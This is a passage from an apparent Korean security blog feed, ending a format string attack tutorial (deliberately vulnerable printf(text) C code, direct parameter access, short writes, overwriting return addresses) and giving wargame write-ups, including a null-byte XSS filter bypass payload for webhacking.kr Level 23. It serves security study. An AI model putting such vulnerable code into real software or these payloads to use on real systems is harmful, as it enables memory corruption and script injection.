                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용법: %s &amp;lt;출력할 텍스트&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용자 입력을 출력하기 위한 좋은 방법:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;사용자 입력을 출력위해 사용하면 안 되는 나쁜 방법:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;c1&quot;&gt;//디버깅 출력&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[*]test_val @ %p = %d, %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test_val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/20.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ex06 예제에서 Format String의 맨 앞부분은 4번째 포맷 인자에 해당한다. 이곳에 접근하려고 &lt;code class=&quot;highlighter-rouge&quot;&gt;%x&lt;/code&gt; 포맷 인자 4개를 사용해 메모리를 건너뛰는 &lt;strong&gt;대신 달러 기호(&lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt;)&lt;/strong&gt;를 사용해 직접 접근하는 방법을 사용할 수 있다.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;달러 기호(&lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt;)는 특수 문자이기 때문에 커맨드라인에서 사용하려면 앞에 역슬래시(&lt;code class=&quot;highlighter-rouge&quot;&gt;\&lt;/code&gt;)문자를 붙여야 한다.&lt;/strong&gt; 이렇게 하면 명령 셀이 달러 기호(&lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt;)를 특수 문자로 인식하지 않는다.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;직접적인 인자 접근법은 메모리 주소에 데이터를 쓰는 과정도 단순화시킨다. 이 방법을 사용하면 메모리에 바로 접근할 수 있으므로 출력 바이트 카운트를 증가시키기 위한 4Byte 쓰레기값을 입력하지 않아도 된다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/21.png&quot; alt=&quot;image-20190212231352003&quot; /&gt;&lt;/p&gt;

&lt;p&gt;보단 간결하게 메모리에 쓰기에 가능해졌다.&lt;/p&gt;

&lt;h3 id=&quot;0x04-format-string-attack쇼트-쓰기-기법&quot;&gt;0x04. Format String Attack(쇼트 쓰기 기법)&lt;/h3&gt;

&lt;p&gt;Format String Attack을 단순화 하는 또 다른 방법은 &lt;strong&gt;쇼트 쓰기 기법&lt;/strong&gt; 이다.&lt;/p&gt;

&lt;p&gt;쇼트(short)는 보통 2Byte 워드이다. 그리고 포맷 인자는 쇼트를 다루는 특별한 방법을 가진다. 쇼트 쓰기는 2Byte 쇼트를 쓰는 포맷 스트링 공격으로 사용할 수 있다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/study/system/Format String Attack/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;앞서 1Byte씩 0xaa, 0xbb, 0xcc, 0xdd를 메모리에 썼다면, 쇼트 쓰기 기법은 0xbbaa, 0xddcc 2Byte씩 메모리에 쓰는 기법이다.&lt;/p&gt;

&lt;h3 id=&quot;0x05-정리&quot;&gt;0x05. 정리&lt;/h3&gt;

&lt;p&gt;임의의 메모리 주소에 데이터를 쓸 수 있다는 것은 프로그램 실행 흐름을 제어할 수 있음을 의미한다. 가장 대표적으로 Stack BufferOverflow에서 사용했던 방법인 Stack Frame의 리턴 주소(RET)를 덮어쓰는 방법이 있다. Foramt String Attack은 임의의 메모리 주소에 데이터를 쓸 수 있으므로 다양한 공격에 활용 할 수 있다.&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="System" /><summary type="html">1. Format String이란? 0x01. Format String 다음은 일반 C프로그램에서 흔히 찾아볼 수 있는 printf함수이다. char str[10] = &quot;World!&quot;; printf(&quot;Hello, %s\n&quot;, str); 직관적으로 &quot; &quot; 안에 포함되어 있는 &quot;Hello, %s\n&quot;이 Format String이다. 즉, Format String은 이를 사용하는 함수에 대해 어떤 형식 또는 형태를 지정해 주는 문자열 을 의미한다. 0x02. Format String 사용시 문제점 일반적으로 프로그래머들이 printf 함수를 사용할 할때 다음과 같은 형식으로 작성한다. printf(&quot;%s&quot;, str); //1번 코드 하지만 어떤 프로그래머들은 프로그래밍을 보다 편하게 하기 위해서 다음과 같이 작성한다. printf(str); //2번 코드 프로그래밍 측면으로 봤을때 1번 코드와, 2번 코드가 잘못된 문법은 아니다. 그리고 2번 코드가 보다 짧은 코드를 사용한다. 따라서 2번 코드가 좀 더 현명해 보일 수 있다. 그러나 2번 소스코드를 이용하여 프로그래밍을 하는 경우는 해커들에게 프로그램의 흐름을 바꿀 수 있는 기회를 제공하게 된다. //ex01.c int main(){ char str[15] = &quot;Hello, World!\n&quot;; printf(&quot;%s&quot;, str); //1번 코드 printf(str); //2번 코드 return 0; } 위 그림과 같이 1번, 2번 코드 모두 같은 기능을 수행하는 것을 볼 수 있다. 그러면 두 코드의 차이는 무엇일까? 0x03. 포맷 인자 printf와 같은 Format String을 사용하는 함수는 포맷 인자(형식 인자)를 함수에 인자로 넘겨 특정 동작을 수행한다. 각 포맷인자는 함수의 인자로 넘겨지며, Format String에 3개의 포맷 인자가 있으면 함수에도 3개의 인자가 있어야 한다. 인자 입력 타입 출력 타입 %d 값 10진수 %u 값 부호 없는 10진수 %x 값 16진수 %s 포인터 문자열 %n 포인터 지금까지 출력한 바이트 수 0x04. 새로운 지시자(drective) “%n” Format String에 사용되는 형식 지시자들 중 %n 은 지금까지 출력한 바이트 수를 다음 변수에 저장한다. //ex02.c int pos, x=235, y=93; printf(&quot;%d %n%d\n&quot;, x, &amp;amp;pos, y); //%n 지시자 사용 printf(&quot;The offset was %d\n&quot;, pos); ex02 소스코드를 보면 pos변수에 4라는 값이 저장되는 것을 볼 수 있다. 이는 “%d %n%d\n” Format String에서 %n 직전까지의 “%d “을 봐야 한다. printf를 통해 화면에 출력될 때 “235 93”이 출력된다. 이때 %n 직전에 문자열은 “235 “이 된다. 따라서 4Byte의 문자열(공백포함)이기에 4라는 숫자가 pos변수에 저장된다. 또 다른 예제를 좀더 살펴보자. //ex03.c int pos, x=0; char buf[20]; snprintf(buf, sizeof(buf), &quot;%.100d%n&quot;, x, &amp;amp;pos); //%n 지시자 사용 printf(&quot;position: %d\n&quot;, pos); ex03코드 같은 경우 pos변수에 100이 저장된다. (%100d 형식지시자는 정수를 100자리로 표현) //ex04.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; int main(){ int A=5, B=7, count_one, count_two; //%n 포맷 스트링 예제 //이 X포인트까지 출력한 바이트 수는 count_one에 저장되고, //여기의 X까지의 바이트 수는 count_two에 저장된다. printf(&quot;The number of bytes written up to this point X%n is being stored in count_one, and the number of bytes up to here X%n is being stored in count_two.\n&quot;, &amp;amp;count_one, &amp;amp;count_two);// printf(&quot;count_one : %d\n&quot;, count_one); printf(&quot;count_two : %d\n&quot;, count_two); return 0; } 2. printf 함수 0x01. printf 함수의 동작방식 //ex05.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; #include&amp;lt;string.h&amp;gt; int main(int argc, char **argv){ char buf[100]; int x; for(x=0; x&amp;lt;100; x++) buf[x]=1; if(argc != 2) exit(1); x=1; strcpy(buf, argv[1]); printf(buf); printf(&quot;\nx is %d/%#x (@ %p)\n&quot;, x, x, &amp;amp;x); return 0; } ex05코드는 argv[1]로 입력받은 값과, 변수 x 정보(정수값, 16진수값, 변수주소)를 출력하는 코드이다. 실행 결과를 보면 argv로 넘겨준 “Hello world”를 출력하고 x변수의 값 1, 16진수값 0x1, 그리고 변수 x의 주소 0xff905e44를 출력하였다. main 함수의 스택을 살펴보면 위와 같다. 실제 디버거를 통해 살펴보면 위 사진과 같다. main함수가 실행되기 이전에 먼저 인자(argument)들이 먼저 스택에 push되고 복귀주소(RET)와 베이스 포인터가 push되고나서 main함수의 지역변수를 위한 공간이 확보된다. 지역 변수가 push될 때, 배열 buf가 먼저 스택에 push되고, int형 변수 x가 push되는 것을 볼 수 있다. 이는 ex05코드상에서 buf 배열이 순차적으로 먼저 코딩되어 있기 때문이다. printf함수 역시 호출하기 전에 printf함수의 인자와 RET, EBP값이 push된다. 위 그림은 main함수 내부에서 printf함수를 호출할 때 스택의 모습이다. 여기서 printf함수의 인자에 들어가는 값은 buf배열이다. (ex05코드에서 buf를 인자로 사용하므로) 이때, buf는 Format String으로 사용될 부분이고, 이는 실제 Format String이 들어가는 것이 아니라 Format String 포인터가 저장된다.(buf배열의 시작주소가 들어간다는 의미) 디버거를 통해 살펴보면 좀더 정확하게 확인 할 수 있다. 이와 같은 스택에 대한 작업이 완료되면 printf함수는 Format String을 파싱하고 실제 출력이 이루어지게된다. 이때, 일반 문자들의 경우에는 일반 문자 그대로를 출력하고, 형식 지시자를 만나는 경우에는 해당 형식 지시자에 대한 내용을 스택에서 4Byte만큼 pop하여 출력하게 된다.(이 개념을 잊으면 안된다.🧐) 이미 앞에서 언급한 것처럼 ==이때 pop되는 것은 스택 상에서 Format String 포인터 다음에 위치한 내용==이 된다. 무슨 말인고 하면… ex05 프로그램을 위와 같이 인자를 넘겨주면 printf함수는 “AAAA”를 출력하고 “%08x”를 만나면 형식지시자로 인식하고 출력을 위해 지정된 변수와는 상관없이 스택에서 4Byte만큼을 pop하여 출력하게 된다. 따라서 스택의 정보를 손쉽게 확인 할 수 있다. 위 그림처럼 %08x 를 7번 입력하니 처음에 입력한 “AAAA” 문자열 값(0x41414141)이 출력되었다. 이를 통해 printf함수 인자로 부터 24Byte만큼 떨어진 곳에 buf배열이 존재한다는 것을 알 수 있다. 앞서 알아낸 정보를 바탕으로 스택에는 위와 같이 구성되어 있음을 알 수 있다. 0x02. Format String Attack(임의의 메모리 주소의 쓰기) 앞서 printf함수의 특징을 살펴보았다. ex04 프로그램 예시에서 인자로 전달했던 %x 포맷인자 대신 %n 를 사용하면 어떻게 될까? 간단히 예상해 볼 수 있는 것은 printf함수는 %n 포맷 인자를 만나면 스택의 내용을 pop하고 pop한 값을 주소로 이용하여 해당 주소에 지금까지 출력된 문자의 개수를 저장하게 된다. 이때 만약 pop한 주소가 RET주소가 되면 프로그램의 흐름을 바꿀 수있다. 이것이 Format String Attack의 주목적이다. //ex06.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; #include&amp;lt;string.h&amp;gt; int main(int argc, char* argv[]){ char text[1024]; static int test_val = -72; if(argc &amp;lt; 2){ printf(&quot;사용법: %s &amp;lt;출력할 텍스트&amp;gt;\n&quot;, argv[0]); exit(0); } strcpy(text, argv[1]); printf(&quot;사용자 입력을 출력하기 위한 좋은 방법:\n&quot;); printf(&quot;%s\n&quot;, text); // 알맞은 printf함수 사용법 printf(&quot;사용자 입력을 출력위해 사용하면 안 되는 나쁜 방법:\n&quot;); printf(text); // 잘못된 printf함수 사용법 printf(&quot;\n&quot;); //디버깅 출력 printf(&quot;[*]test_val @ %p = %d, %p\n&quot;, &amp;amp;test_val, test_val, test_val); return 0; } ex06 프로그램을 먼저 이해해보면, text배열을 1024 Byte만큼 선언하고, test_val변수가 static int형으로 선언되었다. ex06 프로그램을 통해 %n 포맷인자를 이용하여 test_val(값 : -72)의 값을 바꿔보자. 프로그램 실행 후 스택정보를 보면 printf인자와 text배열의 거리가 12Byte임을 알 수 있다. %08x 포맷인자의 크기는 8Byte이다. test_val 변수의 주소는 0x0804c02c이다. 따라서 buf배열의 test_val의 주소를 넣어주고 그뒤로 3번의 %08x 지시자를 넣고 %n 포맷인자를 넣으니 test_val 변수의 값이 31로 바뀌었다. 여기서 왜 test_val의 값이 바뀌었고, 왜 31이라는 값이 들어 갔는지 이해해야 된다. %n지시자는 %n지시자 앞까지의 길이를 저장한다. 해당 길이는 총 31Byte가 되고 이 값을 저장하게 되는데, 이때 %08x지시자로 3번의 pop이 일어 났다. 그 이후 스택의 최상단에는 text배열이기 때문에 해당 스택에 있는 값을 주소를 이용한다. 따라서 text배열에는 0x080498e값이 들어있고 이 주소는 test_val변수의 주소이기 때문에 test_val변수의 값에 31이 저장되게 되는 것이다. 따라서 test_val변수의 주소 대신 RET의 주소를 넣게 되면 프로그램의 흐름을 바꿀 수 있다. 하지만 또 다른 문제가 존재한다. RET의 주소에 우리가 원하는 값으로 변경한다고 했을 때, 보통 특정한 코드를 수행하는 shellcode의 주소를 넣게된다. 그 말은 즉, 주소값을 넣어야 된다는 점이다. 주소는 32bit 환경에서 16진수 8자리로 구성되어 진다. (위에서 test_val 변수의 주소 0x0804c02c이라는 주소처럼…) 이를 해결하기 위해 다음과 같은 방법을 이용하면 된다. 메모리 2c 2d 2e 2f       첫 번째 쓰기(0x0804c02c) aa 00 00 00       두 번째 쓰기(0x0804c02d)   bb 00 00 00     세 번째 쓰기(0x0804c02e)     cc 00 00 00   네 번째 쓰기(0x0804c02f)       dd 00 00 00 결과 aa bb cc dd       예를들어 test_val 변수에 0xddccbbaa 값을 넣고싶다고 하면, test_val 변수의 첫 번째 바이트는 0xaa, 그 이후는 0xbb, 0xcc, 0xdd값을 넣으면 된다. 이때 0xaa는 10진수로 170, 0xbb(187), 0xcc(204), 0xdd(221) 이다. 먼저 0xaa를 넣는다고 하면 %n 포맷인자 앞으로 170Byte의 길이가 있어야 하므로 위 그림처럼 입력하면 된다. 이제 두번째 바이트를 써야 한다. 0xbb는 10진수로 187이므로 %x 포맷 인자가 필요하다. 따라서 %x 포맷인자를 넣어야 하는데 ==여기서 중요한점은 printf함수에서 포맷인자를 만나면 스택에서 4Byte만큼 pop한다는 점==이다. 잊지말자. 😉 현재 스택 맨 상단에는 text배열이므로 이부분이 %x에 들어가면 안된다. 따라서 쓸모없는 4Byte값을 중간에 넣어주어야한다. 즉 위와 같이 1Byte씩 주소를 높여가면 된다. 먼저 0x0804c02c부터 1Byte씩 높여가면서 0x0804c02f까지 주소를 넣어주고, 각 주소에 넣을 값들을 %x 포맷인자를 이용하여 조절 해주면된다. 같은 방식으로 0xddccbbaa를 완성하였다. 이렇게 값들을 넣다보면 한가지 궁금증이 생기가 된다. 0xaabbccdd를 만든다고 할 때, 두 번째 바이트(0xcc)는 첫 번재 바이트(0xdd)보다 작다. 이럴 경우는 어떻해야 할까? 방법은 간단하다. 0xdd(221)를 만들고 나서 0xcc를 넣을 때 0x1cc(460)을 만들어서 1Byte인 0xcc만쓰여지게 하면 된다. 같은 방식으로 0xaabbccdd를 완성하였다. 0x03. Format String Attack(인자에 직접 접근) 앞서 임의의 메모리 주소의 쓰기 방법은 각 포맷 인자에 해당하는 값을 찾으려고 여러 메모리 주소를 건너뛰어야 했다. 그래서 Format String의 맨 앞부분에 도달할 때 까지 %x 포맷 인자를 사용해야만 했다. 그리고 임의의 메모리 주소에 쓰려고 3개의 추가적인 4Byte 쓰레기 값(“EUNI”)을 넣어야 했다. 이제는 직접 인자에 접근하는 방법을 알아보자. //ex07.c #include&amp;lt;stdio.h&amp;gt; int main(){ printf(&quot;7th: %7$d, 4th: %4$05d \n&quot;, 10, 20, 30, 40, 50, 60, 70, 80); //%n$d는 n번째 인자를 10진수로 출력한다. //%7$d이므로 7번째 인자(70)를 출력한다. return 0; } printf의 Foramt String을 살펴보면 %7$d 와 %4$05d 를 사용하여 총 8개의 인자 중 2개만 접근하였다. 이 방법을 이용하면 메모리에 직접 접근 할 수 있으므로 메모리 건너뛰기 위한 노력을 하지 않아도 된다. 위에서 보았던 ex06 예제를 다시 보자. //ex06.c #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; #include&amp;lt;string.h&amp;gt; int main(int argc, char* argv[]){ char text[1024]; static int test_val = -72; if(argc &amp;lt; 2){ printf(&quot;사용법: %s &amp;lt;출력할 텍스트&amp;gt;\n&quot;, argv[0]); exit(0); } strcpy(text, argv[1]); printf(&quot;사용자 입력을 출력하기 위한 좋은 방법:\n&quot;); printf(&quot;%s\n&quot;, text); printf(&quot;사용자 입력을 출력위해 사용하면 안 되는 나쁜 방법:\n&quot;); printf(text); printf(&quot;\n&quot;); //디버깅 출력 printf(&quot;[*]test_val @ %p = %d, %p\n&quot;, &amp;amp;test_val, test_val, test_val); return 0; } ex06 예제에서 Format String의 맨 앞부분은 4번째 포맷 인자에 해당한다. 이곳에 접근하려고 %x 포맷 인자 4개를 사용해 메모리를 건너뛰는 대신 달러 기호($)를 사용해 직접 접근하는 방법을 사용할 수 있다. 달러 기호($)는 특수 문자이기 때문에 커맨드라인에서 사용하려면 앞에 역슬래시(\)문자를 붙여야 한다. 이렇게 하면 명령 셀이 달러 기호($)를 특수 문자로 인식하지 않는다. 직접적인 인자 접근법은 메모리 주소에 데이터를 쓰는 과정도 단순화시킨다. 이 방법을 사용하면 메모리에 바로 접근할 수 있으므로 출력 바이트 카운트를 증가시키기 위한 4Byte 쓰레기값을 입력하지 않아도 된다. 보단 간결하게 메모리에 쓰기에 가능해졌다. 0x04. Format String Attack(쇼트 쓰기 기법) Format String Attack을 단순화 하는 또 다른 방법은 쇼트 쓰기 기법 이다. 쇼트(short)는 보통 2Byte 워드이다. 그리고 포맷 인자는 쇼트를 다루는 특별한 방법을 가진다. 쇼트 쓰기는 2Byte 쇼트를 쓰는 포맷 스트링 공격으로 사용할 수 있다. 앞서 1Byte씩 0xaa, 0xbb, 0xcc, 0xdd를 메모리에 썼다면, 쇼트 쓰기 기법은 0xbbaa, 0xddcc 2Byte씩 메모리에 쓰는 기법이다. 0x05. 정리 임의의 메모리 주소에 데이터를 쓸 수 있다는 것은 프로그램 실행 흐름을 제어할 수 있음을 의미한다. 가장 대표적으로 Stack BufferOverflow에서 사용했던 방법인 Stack Frame의 리턴 주소(RET)를 덮어쓰는 방법이 있다. Foramt String Attack은 임의의 메모리 주소에 데이터를 쓸 수 있으므로 다양한 공격에 활용 할 수 있다.</summary></entry><entry><title type="html">[Web.kr]Level 23</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-23.html" rel="alternate" type="text/html" title="[Web.kr]Level 23" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2023</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-23.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 23/image-20180726154434963.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;sciprt&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; 를 넣는 것이 미션이란다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 23/image-20180726154848452.png&quot; width=&quot;300px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그래서 넣어보았다. “no hack”이라고 출력된다. 앞서 푼 문제들로 추정해 봤을 때, 필터링이 있는 것 같았다. 그래서 어떤 문자가 필터링 되는지 여러가지 문자들을 넣어 보았다.&lt;/p&gt;

&lt;p&gt;’&amp;lt;’, ‘&amp;gt;’, ‘(‘, ‘)’ 등 특수문자들과 숫자는 모두 가능하지만, 알파벳이 연속 2자리 이상 오면 무조건 필터링 된다.&lt;/p&gt;

&lt;p&gt;php나 c같은 백엔드 언어의 경우 문자열에서 %00(NULL)을 만나면 문자열의 끝이라고 생각하고 더 이상 필터링 하지 않는다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%00&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; 를 넣으니 Clear!&lt;/p&gt;</content><author><name>eli_ez3r</name><email>0.0eli.ez3r@gmail.com</email></author><category term="Wargame" /><category term="webhacking.kr(Old)" /><category term="Write-up" /><summary type="html">&amp;lt;sciprt&amp;gt;alert(1);&amp;lt;/script&amp;gt; 를 넣는 것이 미션이란다. 그래서 넣어보았다. “no hack”이라고 출력된다. 앞서 푼 문제들로 추정해 봤을 때, 필터링이 있는 것 같았다. 그래서 어떤 문자가 필터링 되는지 여러가지 문자들을 넣어 보았다. ’&amp;lt;’, ‘&amp;gt;’, ‘(‘, ‘)’ 등 특수문자들과 숫자는 모두 가능하지만, 알파벳이 연속 2자리 이상 오면 무조건 필터링 된다. php나 c같은 백엔드 언어의 경우 문자열에서 %00(NULL)을 만나면 문자열의 끝이라고 생각하고 더 이상 필터링 하지 않는다. %00&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt; 를 넣으니 Clear!</summary></entry><entry><title type="html">[Web.kr]Level 22</title><link href="http://localhost:4000/2018/09/03/writeup-webkr-Level-22.html" rel="alternate" type="text/html" title="[Web.kr]Level 22" /><published>2018-09-03T00:00:00+00:00</published><updated>2018-09-03T00:00:00+00:00</updated><id>http://localhost:4000/2018/09/03/writeup-webkr-Level%2022</id><content type="html" xml:base="http://localhost:4000/2018/09/03/writeup-webkr-Level-22.html">&lt;p&gt;&lt;img src=&quot;http://eliez3r.synology.me/assets/img/writeup/webkr/Level 22/image-20180731213530251.png&quot; width=&quot;400px&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;post&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellpadding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cellspacing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uuid&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;align=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;center&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'login'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'join'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;location.href='?mode=join'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;width:100;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
